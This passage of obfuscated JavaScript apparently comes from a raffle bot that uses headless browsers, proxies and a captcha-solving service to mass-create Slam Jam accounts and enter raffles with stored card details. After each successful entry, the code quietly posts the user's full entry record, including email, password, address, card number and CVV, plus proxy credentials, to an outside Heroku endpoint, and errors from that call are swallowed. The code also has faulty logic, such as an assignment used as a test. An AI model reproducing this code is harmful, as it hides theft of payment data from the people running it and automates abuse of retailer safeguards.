                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x1c5693['type']('#email', '' + _0x24d124[_0x2cc43a]['Email']), await _0x101cd5(0x384), await _0x1c5693['type']('#first_name', '' + _0x24d124[_0x2cc43a]['FirstName']), await _0x101cd5(0x514), await _0x1c5693['type']('#last_name', '' + _0x24d124[_0x2cc43a]['LastName']), await _0x101cd5(0x514), await _0x1c5693['type']('#street_address', _0x24d124[_0x2cc43a]['Address1'] + '\x20' + _0x24d124[_0x2cc43a]['HouseNumber'] + '\x20' + _0x24d124[_0x2cc43a]['Address2']), await _0x101cd5(0x2bc);
                            _0x24d124[_0x2cc43a]['Postcode'] == undefined && (_0x24d124[_0x2cc43a]['Postcode'] = _0x24d124[_0x2cc43a]['Zip']);
                            await _0x1c5693['type']('#zip_code', '' + _0x24d124[_0x2cc43a]['Postcode']), await _0x101cd5(0x320), await _0x1c5693['type']('#city', '' + _0x24d124[_0x2cc43a]['City']), await _0x101cd5(0x320), await _0x1c5693['type']('#bday', '01/01/1994'), await _0x101cd5(0x320), await _0x1c5693['type']('#instagram', '' + _0x24d124[_0x2cc43a]['Follower']), await _0x101cd5(0x352);
                            if (_0x24d124[_0x2cc43a]['Size'] == 'RANDOM') {
                                const _0x1a3bc7 = await _0x1c5693['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xf9ba70 => {
                                    return _0xf9ba70['map'](_0x3b3cdc => _0x3b3cdc['textContent']);
                                });
                                var _0x3b6837 = Math['round'](Math['random']() * (_0x1a3bc7['length'] - 0x1));
                                console['log'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x1a3bc7[_0x3b6837]), await _0x1c5693['click']('label[data-eu-size=\x22' + _0x1a3bc7[_0x3b6837] + '\x22]');
                            } else {
                                console['log'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x24d124[_0x2cc43a]['Size']);
                                try {
                                    await _0x1c5693['click']('label[data-eu-size=\x22' + _0x24d124[_0x2cc43a]['Size'] + '\x22]');
                                } catch {
                                    await _0x1c5693['click']('label[data-eu-size=\x22' + _0x24d124[_0x2cc43a]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x101cd5(0xbb8), await _0x1c5693['$$eval']('.raffle__checkbox-label', _0x2382a8 => _0x2382a8['forEach'](_0x24ddb1 => _0x24ddb1['click']())), await _0x101cd5(0x7d0), console['log'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x1c5693['click']('#raffle__form-submit'), await _0x101cd5(0x1388);
                            try {
                                await _0x1c5693['waitForSelector']('#raffle__confirmation-message-container'), _0x801f14 = 'no', _0x30fd17(_0x24d124[_0x2cc43a], _0x110076), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x4ba24f = _0x24d124[_0x2cc43a];
                                try {
                                    prxdata = {
                                        'username': _0x5b6a98['replace']('#', ''),
                                        'module': _0x110076['name'],
                                        'entrydata': JSON['stringify'](_0x4ba24f),
                                        'proxy': '' + _0x42c998[_0x2cc43a]
                                    };
                                    var _0x664bab = JSON['stringify'](prxdata);
                                    let _0x265773 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x664bab, _0x265773);
                                } catch (_0x1e5afb) {
                                }
                            } catch (_0x3fcb73) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x3fcb73));
                            }
                        } catch (_0x5c7708) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20' + _0x5c7708)), _0x801f14 = 'yes';
                        } finally {
                            _0x496923 && _0x496923['close']();
                            if (_0x801f14 == 'yes' && _0x378788 != 0x5 && _0x410943 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x110076['name'] + ']\x20Task\x20' + (_0x2cc43a + 0x1) + '\x20:\x20Retrying\x20(' + _0x378788 + '\x20/\x205)')), _0x2cc43a = _0x2cc43a - 0x1, _0x378788 = _0x378788 + 0x1;
                                continue;
                            }
                            _0x801f14 == 'yes' && _0x378788 >= 0x5 && (_0x3802e1(_0x24d124[_0x2cc43a], _0x110076), _0x801f14 = 'no', _0x378788 = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x1e25d4, _0x301a4f, _0x2ba1e3) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2ece19 = 0x0; _0x2ece19 < _0x301a4f['length']; _0x2ece19++) {
                        if (_0x887555 != 'yes')
                            var _0x887555 = '', _0x1909e0 = 0x0;
                        var _0x27e4da = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b6a98
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5b5c1b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x300b57
                                }
                            ]
                        }];
                        const _0x4a8dbc = { 'embeds': _0x27e4da };
                        _0x18a4ea(_0x1e25d4['name'] + '\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20/\x20' + _0x301a4f['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        try {
                            await _0x15925d(_0x301a4f, _0x2ece19);
                        } catch {
                            _0x887555 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x420275 = await _0x42c912(_0x301a4f[_0x2ece19], _0x1e25d4, 'acc', ![]);
                        const _0x1c2d44 = { 'succesDEVMSG': { 'embeds': [_0x420275] } };
                        if (_0x301a4f[_0x2ece19]['Email'] == '' || _0x301a4f[_0x2ece19]['FirstName'] == '' || _0x301a4f[_0x2ece19]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x101cd5(0x7d0);
                            continue;
                        }
                        (_0x301a4f[_0x2ece19]['Password'] == '' || _0x301a4f[_0x2ece19] == undefined) && _0x301a4f[_0x2ece19]['Password'] == 'JRaffles23!';
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x36f324 = _0x2ba1e3[_0x2ece19]['split'](':');
                        else
                            var _0xbfdfe2 = Math['round'](Math['random']() * (_0x2ba1e3['length'] - 0x1)), _0x36f324 = _0x2ba1e3[_0xbfdfe2]['split'](':');
                        var _0x59c3a9;
                        try {
                            _0x59c3a9 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x36f324[0x0] + ':' + _0x36f324[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x59c3a9 = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x36f324[0x0] + ':' + _0x36f324[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4a3df2 = await _0x59c3a9['newPage']();
                            await _0x4a3df2['authenticate']({
                                'username': '' + _0x36f324[0x2],
                                'password': '' + _0x36f324[0x3]
                            }), console['log'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a3df2['setRequestInterception'](!![]), _0x4a3df2['on']('request', _0x5bc472 => {
                                _0x5bc472['resourceType']() === 'image' || _0x5bc472['resourceType']() === 'font' || _0x5bc472['resourceType']() === 'media' ? _0x5bc472['abort']() : _0x5bc472['continue']();
                            }), await _0x4a3df2['goto']('https://drop.slamjam.com/account/register'), await _0x101cd5(0xbb8), await _0x4a3df2['waitForSelector']('#FirstName'), await _0x4a3df2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4a3df2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Filling\x20information'), await _0x101cd5(0x4b0), await _0x4a3df2['type']('#FirstName', '' + _0x301a4f[_0x2ece19]['FirstName']), await _0x101cd5(0x226), await _0x4a3df2['type']('#LastName', '' + _0x301a4f[_0x2ece19]['LastName']), await _0x101cd5(0x226), await _0x4a3df2['type']('#Email', '' + _0x301a4f[_0x2ece19]['Email']), await _0x101cd5(0x2ee), await _0x4a3df2['type']('#ConfirmEmail', '' + _0x301a4f[_0x2ece19]['Email']), await _0x101cd5(0x2ee), await _0x4a3df2['type']('#CreatePassword', '' + _0x301a4f[_0x2ece19]['Password']), await _0x101cd5(0x2ee), await _0x4a3df2['type']('#CreateConfirmPassword', '' + _0x301a4f[_0x2ece19]['Password']), await _0x101cd5(0x226), console['log'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Submitting..'), await _0x4a3df2['$eval']('#create_customer', _0x775cf2 => _0x775cf2['submit']()), await _0x101cd5(0x1388), console['log'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20' + _0x1ee8dd['cyan']('Solving\x20Captcha')), await _0x4a3df2['solveRecaptchas'](), console['log'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4a3df2['$eval']('.shopify-challenge__container\x20>\x20form', _0x59d1d2 => _0x59d1d2['submit']());
                            try {
                                await _0x4a3df2['waitForSelector']('.product-card__image'), await _0x101cd5(0x1f4), _0x887555 = 'no', console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Account\x20' + _0x301a4f[_0x2ece19]['Email'] + '\x20Generated!')), _0x467c3c['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x301a4f[_0x2ece19]['Email'] + ',' + _0x301a4f[_0x2ece19]['Password']), console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Account\x20' + _0x301a4f[_0x2ece19]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x1c2d44['succesDEVMSG']);
                                } catch {
                                }
                                await _0x3b1b09(_0x2caac5, _0x1c2d44['succesDEVMSG']);
                            } catch (_0x5a9fb9) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5a9fb9));
                            }
                        } catch (_0x423620) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20' + _0x423620));
                        } finally {
                            _0x59c3a9 && _0x59c3a9['close']();
                            if (_0x887555 == 'yes' && _0x1909e0 != 0x5) {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x1e25d4['name'] + ']\x20Task\x20' + (_0x2ece19 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1909e0 + '\x20/\x205)')), _0x2ece19 = _0x2ece19 - 0x1, _0x1909e0 = _0x1909e0 + 0x1;
                                continue;
                            }
                            _0x887555 == 'yes' && _0x1909e0 >= 0x5 && (_0x3802e1(_0x301a4f[_0x2ece19], _0x1e25d4), _0x887555 = 'no', _0x1909e0 = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x23fd1d, _0x3c561e, _0x4c40dd) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4f01a7 = 0x0; _0x4f01a7 < _0x3c561e['length']; _0x4f01a7++) {
                        var _0x3559ae;
                        if (_0x50e36c != 'yes')
                            var _0x50e36c = '', _0x105d79 = 0x0;
                        _0x18a4ea(_0x23fd1d['name'] + '\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20/\x20' + _0x3c561e['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        try {
                            await _0x15925d(_0x3c561e, _0x4f01a7);
                        } catch {
                            _0x50e36c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3c561e[_0x4f01a7]['Email'] == '' || _0x3c561e[_0x4f01a7]['Password'] == '' || _0x3c561e[_0x4f01a7]['FirstName'] == '' || _0x3c561e[_0x4f01a7]['LastName'] == '') {
                            console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5b5c1b['useRandomProxy'] = ![])
                            var _0x428423 = _0x4c40dd[_0x4f01a7]['split'](':');
                        else
                            var _0x30c959 = Math['round'](Math['random']() * (_0x4c40dd['length'] - 0x1)), _0x428423 = _0x4c40dd[_0x30c959]['split'](':');
                        var _0x5e4e4c;
                        try {
                            _0x5e4e4c = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x428423[0x0] + ':' + _0x428423[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5e4e4c = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x428423[0x0] + ':' + _0x428423[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x67abd0 = await _0x5e4e4c['newPage']();
                            await _0x67abd0['authenticate']({
                                'username': '' + _0x428423[0x2],
                                'password': '' + _0x428423[0x3]
                            }), await _0x67abd0['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x67abd0['setRequestInterception'](!![]), _0x67abd0['on']('request', _0x58c3fe => {
                                _0x58c3fe['resourceType']() === 'image' || _0x58c3fe['resourceType']() === 'font' || _0x58c3fe['resourceType']() === 'media' ? _0x58c3fe['abort']() : _0x58c3fe['continue']();
                            }), await _0x67abd0['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x67abd0['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x67abd0['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x101cd5(0x258), await _0x67abd0['waitForSelector']('#CustomerEmail'), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x67abd0['type']('#CustomerEmail', '' + _0x3c561e[_0x4f01a7]['Email']), await _0x101cd5(0x12c), await _0x67abd0['type']('#CustomerPassword', '' + _0x3c561e[_0x4f01a7]['Password']), await _0x101cd5(0x226), await _0x67abd0['$eval']('#customer_login', _0x32a0d6 => _0x32a0d6['submit']()), await _0x101cd5(0x7d0), await _0x67abd0['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20' + _0x1ee8dd['cyan']('Solving\x20Captcha')), await _0x67abd0['solveRecaptchas'](), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x67abd0['$eval']('.shopify-challenge__container\x20>\x20form', _0x5e342b => _0x5e342b['submit']());
                            try {
                                await _0x67abd0['waitForSelector']('.nav-account'), await _0x101cd5(0x4b0);
                            } catch {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x67abd0['goto']('' + _0x3c561e[_0x4f01a7]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x101cd5(0xbb8), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x67abd0['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x67abd0['click']('.product-select-variant-wrapper'), await _0x101cd5(0x320), await _0x67abd0['click']('li.product-select-variant__value[data-size=\x22' + _0x3c561e[_0x4f01a7]['Size'] + '\x22]'), await _0x101cd5(0x384), await _0x67abd0['$eval']('#AddToCartForm-product-template-raffle', _0x480317 => _0x480317['submit']()), await _0x67abd0['waitForSelector']('.cart-order-summary__content'), await _0x101cd5(0x514), await _0x67abd0['goto']('https://drop.slamjam.com/checkout'), await _0x101cd5(0x514), await _0x67abd0['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x67abd0['select']('#checkout_shipping_address_country', '' + _0x3c561e[_0x4f01a7]['Country']), await _0x101cd5(0x200), await _0x67abd0['waitForSelector']('#checkout_shipping_address_first_name'), await _0x67abd0['type']('#checkout_shipping_address_first_name', '' + _0x3c561e[_0x4f01a7]['FirstName']), await _0x101cd5(0x237), await _0x67abd0['type']('#checkout_shipping_address_last_name', '' + _0x3c561e[_0x4f01a7]['LastName']), await _0x101cd5(0x1e0), await _0x67abd0['type']('#checkout_shipping_address_address1', _0x3c561e[_0x4f01a7]['Address1'] + '\x20' + _0x3c561e[_0x4f01a7]['HouseNumber']), await _0x101cd5(0x514), await _0x67abd0['type']('#checkout_shipping_address_address2', '' + _0x3c561e[_0x4f01a7]['Address2']), await _0x101cd5(0x514);
                            _0x3c561e[_0x4f01a7]['Postcode'] == undefined && (_0x3c561e[_0x4f01a7]['Postcode'] = _0x3c561e[_0x4f01a7]['Zip']);
                            await _0x67abd0['type']('#checkout_shipping_address_zip', '' + _0x3c561e[_0x4f01a7]['Postcode']), await _0x101cd5(0x2bc), await _0x67abd0['type']('#checkout_shipping_address_city', '' + _0x3c561e[_0x4f01a7]['City']), await _0x101cd5(0x320), await _0x67abd0['type']('#checkout_shipping_address_phone', '' + _0x3c561e[_0x4f01a7]['Phone']), await _0x101cd5(0x320), await _0x67abd0['click']('#continue_button'), await _0x101cd5(0xbb8), await _0x67abd0['waitForSelector']('.summary-title'), await _0x101cd5(0x320), await _0x67abd0['click']('#continue_button'), await _0x101cd5(0x320), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x67abd0['waitForSelector']('#checkout_credit_card_vault'), await _0x101cd5(0x3e8);
                            var _0x58417c = await _0x67abd0['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1c9170 = await _0x58417c['contentFrame']();
                            await _0x1c9170['click']('#number'), await _0x101cd5(0x3e8), await _0x1c9170['type']('#number', '' + _0x3c561e[_0x4f01a7]['CardNumber'], { 'delay': 0x78 }), _0x58417c = await _0x67abd0['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1c9170 = await _0x58417c['contentFrame'](), await _0x101cd5(0x1c2), await _0x1c9170['click']('#name'), await _0x101cd5(0x1f4), await _0x1c9170['type']('#name', '' + _0x3c561e[_0x4f01a7]['NameOnCard'], { 'delay': 0x78 }), _0x58417c = await _0x67abd0['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1c9170 = await _0x58417c['contentFrame'](), await _0x101cd5(0x1c2), await _0x1c9170['click']('#expiry'), await _0x101cd5(0x1f4), await _0x1c9170['type']('#expiry', '' + _0x3c561e[_0x4f01a7]['ExpiryDate'], { 'delay': 0x78 }), _0x58417c = await _0x67abd0['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1c9170 = await _0x58417c['contentFrame'](), await _0x101cd5(0x1c2), await _0x1c9170['click']('#verification_value'), await _0x101cd5(0x1f4), await _0x1c9170['type']('#verification_value', '' + _0x3c561e[_0x4f01a7]['CVV'], { 'delay': 0x78 }), await _0x67abd0['$eval']('#accepts-flag-raffle', _0x5f5461 => _0x5f5461['click']()), await _0x101cd5(0x7d0), console['log'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x67abd0['$eval']('#continue_button', _0x343d94 => _0x343d94['click']()), await _0x101cd5(0x1b58), await _0x67abd0['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x67abd0['$eval']('.edit_checkout.animate-floating-labels', _0x2af930 => _0x2af930['submit']()), await _0x101cd5(0x7d0);
                            try {
                                await _0x67abd0['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x50e36c = 'no', _0x30fd17(_0x3c561e[_0x4f01a7], _0x23fd1d), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4eaf84) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x4eaf84['message']);
                            }
                            var _0x5d3902 = await _0x42c912(_0x3c561e[_0x4f01a7], _0x23fd1d, 'dev', ![]), _0x53aba6 = await _0x42c912(_0x3c561e[_0x4f01a7], _0x23fd1d, 'pub', ![]);
                            let _0x39a91f = _0x3c561e[_0x4f01a7];
                            try {
                                prxdata = {
                                    'username': _0x5b6a98['replace']('#', ''),
                                    'module': _0x23fd1d['name'],
                                    'entrydata': JSON['stringify'](_0x39a91f),
                                    'proxy': '' + _0x4c40dd[_0x4f01a7]
                                };
                                var _0x17ca70 = JSON['stringify'](prxdata);
                                let _0x57fcde = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3036f9['post']('https://jraffles.herokuapp.com/success', _0x17ca70, _0x57fcde);
                            } catch (_0x50ae21) {
                            }
                            const _0x1d0824 = {
                                'succesDEVMSG': { 'embeds': [_0x5d3902] },
                                'succesPUBMSG': { 'embeds': [_0x53aba6] }
                            };
                            try {
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x1d0824['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x1d0824['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x1d0824['succesPUBMSG']);
                            } catch (_0xbf1fb6) {
                                console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xbf1fb6));
                            }
                        } catch (_0x2b16a6) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x2db3d[taskModule]['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20' + _0x2b16a6)), _0x3559ae = '' + _0x2b16a6;
                            var _0x30f14f = await _0x42c912(kickz[_0x4f01a7], _0x23fd1d, 'dev', !![], _0x3559ae);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x30f14f] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], EMBEDS['errorDEV']), await _0x3b1b09(_0x57f30c, EMBEDS['errorDEV']), _0x50e36c = 'yes';
                        } finally {
                            _0x5e4e4c && _0x5e4e4c['close']();
                            if (_0x50e36c == 'yes' && _0x105d79 != 0x5 && _0x3559ae != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x23fd1d['name'] + ']\x20Task\x20' + (_0x4f01a7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x105d79 + '\x20/\x205)')), _0x4f01a7 = _0x4f01a7 - 0x1, _0x105d79 = _0x105d79 + 0x1;
                                continue;
                            }
                            _0x50e36c == 'yes' && _0x105d79 >= 0x5 && (_0x3802e1(_0x3c561e[_0x4f01a7], _0x23fd1d), _0x50e36c = 'no', _0x105d79 = 0x0), console['log']('Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x35f6a4) {
                    var _0x1f74bc = await _0x3fe8ad(), _0x51fea5 = _0x467c3c['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x183f62 = _0x416c9b['parse'](_0x51fea5, { 'header': !![] })['data'];
                    for (var _0x575c6e = 0x0; _0x575c6e < _0x183f62['length']; _0x575c6e++) {
                        var _0x128096 = _0x183f62[_0x575c6e]['Store'], _0x2a8731 = _0x183f62[_0x575c6e]['Mode'];
                        for (var _0x339ec1 of _0x2db3d) {
                            const _0x429a07 = _0x339ec1['name']['includes'](_0x128096);
                            if (!_0x429a07)
                                continue;
                            for (mode of _0x339ec1['modules']) {
                                if (mode['name'] == _0x2a8731) {
                                    console['log']('Running\x20' + _0x1ee8dd['cyan'](mode['name'])), await mode['function'](mode, [_0x183f62[_0x575c6e]], _0x1f74bc);
                                    var _0x3c0189 = _0x51fea5['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x467c3c['writeFileSync']('../failed-tasks.csv', _0x3c0189);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x215d09 = await _0x13036b['get']('Answer');
                    if (_0x215d09['Answer']['toLowerCase']() == 'y') {
                        _0x467c3c['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x101cd5(0x3e8);
                        return;
